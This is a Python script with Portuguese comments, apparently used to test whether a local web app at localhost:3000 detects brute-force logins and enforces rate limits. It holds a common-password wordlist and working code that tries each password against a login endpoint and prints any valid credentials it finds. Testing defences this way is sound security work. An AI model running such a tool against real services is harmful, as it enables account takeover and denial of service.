"""
Script de Ataque Controlado - Brute Force
Testa a detecção de tentativas massivas de login
"""

import requests
import time
from typing import List
import argparse

# Configurações
BASE_URL = "http://localhost:3000"
LOGIN_ENDPOINT = f"{BASE_URL}/auth/login"

# Wordlists comuns
COMMON_PASSWORDS = [
    "123456",
    "password",
    "123456789",
    "12345678",
    "12345",
    "1234567",
    "admin",
    "123123",
    "qwerty",
    "abc123",
    "password123",
    "admin123",
    "letmein",
    "welcome",
    "monkey",
    "1234567890",
    "football",
    "dragon",
    "master",
    "shadow",
    "superman",
    "michael",
    "jennifer",
    "trustno1",
    "batman",
    "starwars",
    "1q2w3e4r",
    "killer",
    "sunshine",
    "iloveyou",
    "princess",
    "solo",
    "charlie",
    "freedom",
    "whatever",
    "qazwsx",
    "ninja",
    "mustang",
    "access",
    "hello",
    "696969",
    "!@#$%^&*",
    "jordan23",
    "passw0rd",
    "Password1",
    "P@ssw0rd",
    "qwerty123",
    "zxcvbnm",
    "asdfgh",
    "123qwe",
    "1qaz2wsx",
]

COMMON_EMAILS = [
    "admin@example.com",
    "admin@localhost",
    "root@localhost",
    "test@test.com",
    "user@example.com",
]


def brute_force_attack(
    target_email: str,
    passwords: List[str],
    delay: float = 0.1,
    verbose: bool = True,
) -> dict:
    """
    Executa ataque de força bruta contra endpoint de login
    
    Args:
        target_email: Email alvo
        passwords: Lista de senhas para testar
        delay: Delay entre tentativas (segundos)
        verbose: Mostra progresso
    
    Returns:
        dict com resultados do ataque
    """
    results = {
        "total_attempts": 0,
        "successful": False,
        "blocked_at": None,
        "valid_credentials": [],
        "responses": [],
    }

    print(f"\n🔴 Iniciando Brute Force Attack")
    print(f"   Target: {target_email}")
    print(f"   Passwords: {len(passwords)}")
    print(f"   Delay: {delay}s\n")

    for idx, password in enumerate(passwords, 1):
        try:
            results["total_attempts"] += 1

            payload = {"email": target_email, "password": password}

            response = requests.post(LOGIN_ENDPOINT, json=payload, timeout=5)

            results["responses"].append({
                "attempt": idx,
                "password": password,
                "status": response.status_code,
                "response": response.json() if response.headers.get('content-type') == 'application/json' else response.text[:100],
            })

            # Marca sucesso mas continua testando
            status_icon = "✓" if response.status_code == 200 else " "
            
            if verbose:
                print(f"[{status_icon}] [{idx}/{len(passwords)}] Testing: {password:<20} | Status: {response.status_code}")

            # Sucesso no login - armazena mas continua
            if response.status_code == 200:
                results["successful"] = True
                results["valid_credentials"].append({"email": target_email, "password": password})

            # Sistema bloqueou
            if response.status_code == 403 or "blocked" in response.text.lower():
                results["blocked_at"] = idx
                print(f"\n🚫 BLOQUEADO após {idx} tentativas!")
                print(f"   Sistema detectou o ataque e bloqueou o IP")
                break

            time.sleep(delay)

        except requests.exceptions.RequestException as e:
            print(f"\n❌ Erro na requisição: {e}")
            break

    return results


def test_rate_limiting(requests_count: int = 50, burst_mode: bool = True):
    """
    Testa rate limiting enviando múltiplas requisições rapidamente
    """
    print(f"\n🔴 Testando Rate Limiting")
    print(f"   Requisições: {requests_count}")
    print(f"   Modo: {'BURST' if burst_mode else 'NORMAL'}\n")

    blocked_at = None

    for i in range(1, requests_count + 1):
        try:
            response = requests.post(
                LOGIN_ENDPOINT,
                json={"email": "test@test.com", "password": f"test{i}"},
                timeout=5,
            )

            print(f"[{i}/{requests_count}] Status: {response.status_code}")

            if response.status_code == 429 or response.status_code == 403:
                blocked_at = i
                print(f"\n🚫 Rate limit atingido na requisição {i}")
                break

            if not burst_mode:
                time.sleep(0.1)

        except Exception as e:
            print(f"Erro: {e}")
            break

    return {"total_sent": i, "blocked_at": blocked_at}


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute Force Attack Simulator")
    parser.add_argument(
        "--email",
        default="admin@example.com",
        help="Target email address",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.1,
        help="Delay between attempts (seconds)",
    )
    parser.add_argument(
        "--test-rate-limit",
        action="store_true",
        help="Test rate limiting instead of brute force",
    )

    args = parser.parse_args()

    if args.test_rate_limit:
        test_rate_limiting()
    else:
        results = brute_force_attack(args.email, COMMON_PASSWORDS, args.delay)
        
        print(f"\n{'='*60}")
        print("RELATÓRIO DE ATAQUE")
        print(f"{'='*60}")
        print(f"Total de tentativas: {results['total_attempts']}")
        print(f"Sucesso: {'✅ SIM' if results['successful'] else '❌ NÃO'}")
        
        if results['valid_credentials']:
            print(f"\n✅ CREDENCIAIS VÁLIDAS ENCONTRADAS:")
            for cred in results['valid_credentials']:
                print(f"   📧 Email: {cred['email']}")
                print(f"   🔑 Password: {cred['password']}")
        
        if results['blocked_at']:
            print(f"\nBloqueado na tentativa: {results['blocked_at']}")
        print(f"{'='*60}\n")
